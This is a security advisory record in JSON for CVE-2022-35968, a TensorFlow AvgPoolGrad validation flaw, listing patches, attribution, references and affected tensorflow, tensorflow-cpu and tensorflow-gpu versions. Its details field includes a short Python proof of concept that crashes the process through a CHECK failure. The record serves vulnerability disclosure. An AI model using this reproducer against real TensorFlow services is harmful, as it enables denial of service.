{
  "id": "GHSA-2475-53vw-vp25",
  "summary": "TensorFlow vulnerable to `CHECK` fail in `AvgPoolGrad`",
  "details": "### Impact\nThe implementation of `AvgPoolGrad` does not fully validate the input `orig_input_shape`. This results in a `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"VALID\"\ndata_format = \"NHWC\"\norig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)\ngrad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)\ntf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
  "aliases": [
    "BIT-tensorflow-2022-35968",
    "CVE-2022-35968"
  ],
  "modified": "2023-12-06T01:02:26.499492Z",
  "published": "2022-09-16T22:16:52Z",
  "database_specific": {
    "nvd_published_at": "2022-09-16T21:15:00Z",
    "github_reviewed_at": "2022-09-16T22:16:52Z",
    "severity": "MODERATE",
    "github_reviewed": true,
    "cwe_ids": [
      "CWE-617"
    ]
  },
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35968"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/tensorflow/tensorflow"
    },
    {
      "type": "WEB",
      "url": "https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0"
    }
  ],
  "affected": [
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "0.12.0",
        "0.12.1",
        "1.0.0",
        "1.0.1",
        "1.1.0",
        "1.10.0",
        "1.10.1",
        "1.11.0",
        "1.12.0",
        "1.12.2",
        "1.12.3",
        "1.13.1",
        "1.13.2",
        "1.14.0",
        "1.15.0",
        "1.15.2",
        "1.15.3",
        "1.15.4",
        "1.15.5",
        "1.2.0",
        "1.2.1",
        "1.3.0",
        "1.4.0",
        "1.4.1",
        "1.5.0",
        "1.5.1",
        "1.6.0",
        "1.7.0",
        "1.7.1",
        "1.8.0",
        "1.9.0",
        "2.0.0",
        "2.0.1",
        "2.0.2",
        "2.0.3",
        "2.0.4",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.0rc0",
        "2.6.0rc1",
        "2.6.0rc2",
        "2.6.1",
        "2.6.2",
        "2.6.3",
        "2.6.4",
        "2.6.5",
        "2.7.0",
        "2.7.0rc0",
        "2.7.0rc1",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.9.0"
            },
            {
              "fixed": "2.9.1"
            }
          ]
        }
      ],
      "versions": [
        "2.9.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "1.15.0",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.1",
        "2.6.2",
        "2.6.3",
        "2.6.4",
        "2.6.5",
        "2.7.0",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-cpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-cpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.9.0"
            },
            {
              "fixed": "2.9.1"
            }
          ]
        }
      ],
      "versions": [
        "2.9.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.7.2"
            }
          ]
        }
      ],
      "versions": [
        "0.12.0",
        "0.12.1",
        "1.0.0",
        "1.0.1",
        "1.1.0",
        "1.10.0",
        "1.10.1",
        "1.11.0",
        "1.12.0",
        "1.12.2",
        "1.12.3",
        "1.13.1",
        "1.13.2",
        "1.14.0",
        "1.15.0",
        "1.15.2",
        "1.15.3",
        "1.15.4",
        "1.15.5",
        "1.2.0",
        "1.2.1",
        "1.3.0",
        "1.4.0",
        "1.4.1",
        "1.5.0",
        "1.5.1",
        "1.6.0",
        "1.7.0",
        "1.7.1",
        "1.8.0",
        "1.9.0",
        "2.0.0",
        "2.0.1",
        "2.0.2",
        "2.0.3",
        "2.0.4",
        "2.1.0",
        "2.1.1",
        "2.1.2",
        "2.1.3",
        "2.1.4",
        "2.2.0",
        "2.2.1",
        "2.2.2",
        "2.2.3",
        "2.3.0",
        "2.3.1",
        "2.3.2",
        "2.3.3",
        "2.3.4",
        "2.4.0",
        "2.4.1",
        "2.4.2",
        "2.4.3",
        "2.4.4",
        "2.5.0",
        "2.5.1",
        "2.5.2",
        "2.5.3",
        "2.6.0",
        "2.6.1",
        "2.6.2",
        "2.6.3",
        "2.6.4",
        "2.6.5",
        "2.7.0",
        "2.7.0rc0",
        "2.7.0rc1",
        "2.7.1"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.8.0"
            },
            {
              "fixed": "2.8.1"
            }
          ]
        }
      ],
      "versions": [
        "2.8.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    },
    {
      "package": {
        "name": "tensorflow-gpu",
        "ecosystem": "PyPI",
        "purl": "pkg:pypi/tensorflow-gpu"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "2.9.0"
            },
            {
              "fixed": "2.9.1"
            }
          ]
        }
      ],
      "versions": [
        "2.9.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-2475-53vw-vp25/GHSA-2475-53vw-vp25.json"
      }
    }
  ],
  "schema_version": "1.6.0",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  ]
}